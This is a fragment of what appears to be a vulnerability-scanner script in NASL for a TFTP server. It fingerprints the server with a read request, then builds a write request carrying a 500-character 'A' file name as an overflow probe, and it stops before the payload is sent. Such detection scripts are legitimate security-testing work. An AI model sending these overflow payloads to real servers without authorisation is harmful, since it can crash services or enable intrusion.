...
mode = "netascii";
req = raw_string( 0x00, 0x01 ) + "AAA.txt" + raw_string( 0x00 ) + mode + raw_string( 0x00 );
send( socket: soc, data: req );
res = recv( socket: soc, length: 100 );
if(!res || !ContainsString( res, "Not Found in local Storage" )){
	close( soc );
	exit( 0 );
}
attack = raw_string( 0x00, 0x02 ) + crap( data: "A", length: 500 ) + raw_string( 0x00 ) + mode + raw_string( 0x00 );
